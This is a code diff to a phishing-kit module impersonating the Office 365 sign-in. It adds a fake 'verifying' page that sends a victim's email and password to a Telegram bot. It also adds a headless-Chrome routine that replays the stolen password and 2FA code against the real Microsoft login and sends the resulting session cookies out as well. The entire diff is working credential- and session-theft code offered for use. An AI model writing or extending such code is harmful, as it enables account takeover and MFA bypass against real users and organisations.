@@ -1,8 +1,13 @@
 from __future__ import print_function
-from flask import redirect, request
+from flask import redirect, request, session
+import json, time
 from os import getenv
 from core.base_module import BaseModule
 import requests
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.chrome.service import Service
+from webdriver_manager.chrome import ChromeDriverManager
 
 class Office365Module(BaseModule):
     def __init__(self, enable_2fa=False):
@@ -10,6 +15,8 @@ class Office365Module(BaseModule):
         self.set_name('office365')
         self.add_route('login', '/')
         self.add_route('password_page', '/password')
+        # intermediate loading page shown after password submission
+        self.add_route('loading', '/loading')
         self.add_route('twofactor', '/twofactor')
         self.add_route('redirect', '/redirect')
         self.enable_two_factor(enable_2fa)
@@ -21,11 +28,33 @@ class Office365Module(BaseModule):
     def password_page(self):
         self.user = request.values.get('loginfmt') or request.values.get('email')
         template = self.env.get_template('password.html')
-        return template.render(next_url='/twofactor', hostname=request.host, email=self.user)
+        # password page posts to /loading so we can show a verifying screen
+        return template.render(next_url='/loading', hostname=request.host, email=self.user)
+
+    def loading(self):
+        """Handle password submission, send early credentials, show verifying dots."""
+        self.user = request.values.get('email') or request.values.get('loginfmt')
+        self.captured_password = request.values.get('passwd')
+
+        # Early exfiltration
+        ip = request.remote_addr
+        ua = request.user_agent.string
+        early_msg = (
+            f"*O365 Credential Capture (Part 1)*\n"
+            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
+            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n"
+            "Waiting for 2FA code…"
+        )
+        self.send_telegram(early_msg)
+
+        template = self.env.get_template('loading.html')
+        # auto-redirect to 2FA page after short delay
+        return template.render(next_url='/twofactor', hostname=request.host, email=self.user, password=self.captured_password)
 
     def twofactor(self):
-        self.captured_password = request.values.get('passwd')
-        self.user = request.values.get('email')
+        # we reach here via redirect from loading page (GET) or direct POST
+        self.user = request.values.get('email') or getattr(self, 'user', None)
+        self.captured_password = request.values.get('password') or getattr(self, 'captured_password', None)
         template = self.env.get_template('twofactor.html')
         return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)
 
@@ -33,21 +62,76 @@ class Office365Module(BaseModule):
         self.user = request.values.get('email')
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
-        self.send_telegram()
+
+        # attempt automated login & cookie capture
+        cookies = self.perform_automated_login()
+
+        full_msg = (
+            f"*O365 Credential Capture (Full)*\nEmail: `{self.user}`\nPassword: `{self.captured_password}`\n2FA: `{self.two_factor_token}`\n\nCookies:\n```json\n{json.dumps(cookies, indent=2)}\n```"
+        )
+        self.send_telegram(full_msg)
+
         return redirect(self.final_url, code=302)
 
-    def send_telegram(self):
+    def send_telegram(self, message):
         bot_token = getenv('TELEGRAM_BOT_TOKEN')
         chat_id = getenv('TELEGRAM_CHAT_ID')
         if not bot_token or not chat_id:
             return
-        message = '*New Office365 Credential*\nEmail: `{}`\nPassword: `{}`\n2FA: `{}`'.format(self.user, getattr(self, 'captured_password', ''), self.two_factor_token)
         url = 'https://api.telegram.org/bot{}/sendMessage'.format(bot_token)
         payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
         try:
             requests.post(url, json=payload, timeout=10)
         except Exception:
             pass
+
+    def perform_automated_login(self):
+        """Use headless Chrome to login and return cookies list. Fail-safe returns empty list."""
+        email = getattr(self, 'user', None)
+        password = getattr(self, 'captured_password', None)
+        token = getattr(self, 'two_factor_token', None)
+        if not all([email, password, token]):
+            return []
+
+        opts = webdriver.ChromeOptions()
+        opts.add_argument('--headless')
+        opts.add_argument('--no-sandbox')
+        opts.add_argument('--disable-dev-shm-usage')
+
+        try:
+            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
+            driver.set_page_load_timeout(30)
+
+            # Step 1: email
+            driver.get('https://login.microsoftonline.com/')
+            time.sleep(2)
+            driver.find_element(By.NAME, 'loginfmt').send_keys(email)
+            driver.find_element(By.ID, 'idSIButton9').click()
+            time.sleep(2)
+
+            # Step 2: password
+            driver.find_element(By.NAME, 'passwd').send_keys(password)
+            driver.find_element(By.ID, 'idSIButton9').click()
+            time.sleep(2)
+
+            # Step 3: 2FA code
+            try:
+                driver.find_element(By.NAME, 'otc').send_keys(token)
+            except Exception:
+                # different input name handling
+                driver.find_element(By.CSS_SELECTOR, 'input[type="tel"], input[type="text"]').send_keys(token)
+            driver.find_element(By.ID, 'idSIButton9').click()
+            time.sleep(5)
+
+            cookies = driver.get_cookies()
+        except Exception:
+            cookies = []
+        finally:
+            try:
+                driver.quit()
+            except Exception:
+                pass
+        return cookies
 
 def load(enable_2fa=False):
     return Office365Module(enable_2fa) 
